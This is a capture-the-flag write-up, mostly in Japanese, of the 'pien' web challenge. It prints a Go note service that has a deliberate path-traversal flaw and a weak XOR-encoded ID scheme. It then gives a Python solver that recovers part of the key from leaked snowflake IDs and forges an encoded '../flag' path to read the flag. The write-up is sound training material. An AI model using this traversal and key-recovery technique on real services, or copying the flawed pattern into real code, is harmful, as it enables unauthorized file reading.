# pien:web:250pts
I wrote another note service, and showed it to my nerd friend, and the guy told me that it's still vulnerable. WHY?  
He must know exactly when I started the server? hmm? Am I wrong?  
NOTE: Our server is weak. No DoS please 😭 (The intended soluation does NOT require any DoS)  
NOTE2: The server can be reset without any notification.  
[http://35.200.110.16:8081/](http://35.200.110.16:8081/)  

[pien.tar.gz](pien.tar.gz)  

# Solution
URLとソースコードが渡される。  
アクセスすると文字列をメモできるサービスのようだ。  
![site.png](site/site.png)  
作成したメモのURLを見ると以下のようで、おそらくbase64されている。  
```
http://35.200.110.16:8081/view/note/SS9qeVwLzGoLp0JdFvaHagINnw==
```
`get id!`なるリンクから謎のidを取得できるようだ。  
```bash
$ curl http://35.200.110.16:8081/id
1728304496150319104
```
次に、ソースを見ると主要部分は以下であった。  
```go
~~~
func init() {
	file, err := os.Open("./index.html")
	if err != nil {
		panic(err)
	}
	defer file.Close()
	data, err := io.ReadAll(file)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}
	indexHTML = string(data)

	node, err = snowflake.NewNode(1)
	if err != nil {
		panic(err)
	}

	DATA = os.Getenv("DATADIR")
	if DATA == "" {
		DATA = "./data"
	}

	key = make([]byte, KEYLEN)
	_, err = rand.Read(key)
	if err != nil {
		panic(err)
	}
}

func dec(s string) (string, error) {
	b, err := base64.URLEncoding.DecodeString(s)
	if err != nil || len(b) > KEYLEN {
		return "", err
	}
	for i := 0; i < len(b); i++ {
		b[i] ^= key[i]
	}
	return string(b), nil
}

func enc(s string) string {
	b := []byte(s)
	for i := 0; i < len(b); i++ {
		b[i] ^= key[i]
	}
	return base64.URLEncoding.EncodeToString(b)
}

type PostNote struct {
	Data string `json:"data"`
}

func main() {
	e := echo.New()
	e.Use(middleware.Logger())

	e.GET("/", func(c echo.Context) error {
		return c.HTML(http.StatusOK, indexHTML)
	})

	e.GET("/id", func(c echo.Context) error {
		id := node.Generate()
		return c.String(http.StatusOK, id.String())
	})

	e.POST("/note", func(c echo.Context) error {
		pn := new(PostNote)
		if err := c.Bind(pn); err != nil {
			return c.String(http.StatusBadRequest, "Invalid request")
		}
		data := pn.Data
		if len(data) > 1024 {
			return c.String(http.StatusBadRequest, "Invalid request")
		}
		id := node.Generate()
		f, err := os.Create(DATA + "/" + id.String())
		if err != nil {
			fmt.Printf("Open Error: %v\n", err)
			return c.String(http.StatusInternalServerError, "Internal Server Error")
		}
		_, err = f.WriteString(data)
		if err != nil {
			fmt.Printf("Write Error: %v\n", err)
			return c.String(http.StatusInternalServerError, "Internal Server Error")
		}
		encodedID := enc(id.String())
		// redirect to /note?id=<uuid>
		return c.Redirect(http.StatusFound, "/note/"+encodedID)
	})

	// /note?id=<uuid>
	e.GET("/note/:noteID", func(c echo.Context) error {
		encodedID := c.Param("noteID")
		if encodedID == "" {
			return c.String(http.StatusBadRequest, "Invalid id")
		}
		id, err := dec(encodedID)
		if err != nil {
			return c.String(http.StatusBadRequest, "Invalid id")
		}

		fmt.Printf("File: %s\n", DATA+"/"+id)

		f, err := os.Open(DATA + "/" + id)
		if err != nil {
			return c.String(http.StatusInternalServerError, "Internal Server Error")
		}
		data, err := io.ReadAll(f)
		if err != nil {
			return c.String(http.StatusInternalServerError, "Internal Server Error")
		}

		return c.String(http.StatusOK, string(data))
	})

	e.GET("/view/note/:noteID", func(c echo.Context) error {
		return c.HTML(http.StatusOK, indexHTML)
	})

	e.Debug = true
	e.Logger.SetLevel(log.DEBUG)
	panic(e.Start(":8081"))
}
```
同梱されているcompose.ymlおよびDockerfileより、フラグは`/flag`にあるようだ。  
ソースを見ると`/data`以下に`id := node.Generate()`でファイル名を作り、メモをファイルに保存している。  
さらに`id`と秘密の`key`をxorし、base64してメモのURLとしている。  
メモはファイル名であるidで自由に閲覧できるので、パストラバーサルでidを`../flag`としてやればフラグは読めるが、`key`がわからない。  
ここで、idを複数回取得してやると、先頭部分が共通していることがわかる。  
```bash
$ curl http://35.200.110.16:8081/id
1728309588127649792
$ curl http://35.200.110.16:8081/id
1728309591738945536
$ curl http://35.200.110.16:8081/id
1728309595849363456
```
共通しているidの先頭部分とメモのURL(`id`と`key`のxorのbase64enc)とを再度xorすると、`key`の先頭部分が入手できることに気づく。  
`dec`関数はデータ長のみ`key`とxorするため、`../flag`の7文字分の`key`が手に入ればよい。  
以下のsolver.pyでフラグを読み取るURLの作成までを行う。  
```python
import base64
import requests


def xor_bytes(b1, b2):
    return bytes(a ^ b for a, b in zip(b1, b2))


id7 = requests.get("http://35.200.110.16:8081/id").text[:7]
note = requests.post(
    "http://35.200.110.16:8081/note",
    json={
        "data": "satoki",
    },
    allow_redirects=False,
)
url7 = base64.b64decode(note.headers.get("Location").replace("/note/", ""))[:7]

key7 = xor_bytes(id7.encode(), url7)
flag_url = xor_bytes(key7, b"../flag")

print(base64.b64encode(flag_url).decode())
```
実行する。  
```bash
$ python solver.py
VjZ3JwNanw==
```
![flag.png](site/flag.png)  
`http://35.200.110.16:8081/view/note/VjZ3JwNanw==`にアクセスするとflagが得られた。  

## TSGLIVE{I'm doing ISUCON, so I don't know what is happening in TSGLIVE sorry}